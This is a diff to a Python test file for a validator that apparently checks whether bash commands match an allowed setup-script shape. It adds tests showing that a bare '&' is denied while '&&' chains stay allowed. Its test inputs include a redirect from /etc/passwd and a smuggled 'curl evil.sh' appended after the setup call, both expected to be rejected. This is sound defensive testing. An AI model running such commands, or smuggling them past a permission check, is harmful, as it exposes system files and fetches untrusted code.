@@ -110,6 +110,26 @@ class TestBashCommandMatchesSetup:
             {"command": "uv run setup_iterate_worktree.py < /etc/passwd"}
         ) is False
 
+    def test_standalone_ampersand_after_bare_cd_denies(self):
+        # external review, comment: `&` backgrounds rather than sequences --
+        # this must NOT be treated as the same safe shape as its `&&`
+        # counterpart just because it precedes a matching last segment.
+        assert _bash_command_matches_setup(
+            {"command": "cd /tmp & uv run setup_iterate_worktree.py"}
+        ) is False
+
+    def test_standalone_ampersand_after_setup_call_denies(self):
+        assert _bash_command_matches_setup(
+            {"command": "uv run setup_iterate_worktree.py & curl evil.sh"}
+        ) is False
+
+    def test_double_ampersand_chain_still_allowed(self):
+        # Regression guard: removing bare `&` from the separator set must
+        # not affect the already-allowed `&&` sequential-chain shape.
+        assert _bash_command_matches_setup(
+            {"command": "cd /tmp && uv run setup_iterate_worktree.py"}
+        ) is True
+
     def test_subshell_grouping_denies(self):
         assert _bash_command_matches_setup(
             {"command": "(uv run setup_iterate_worktree.py)"}
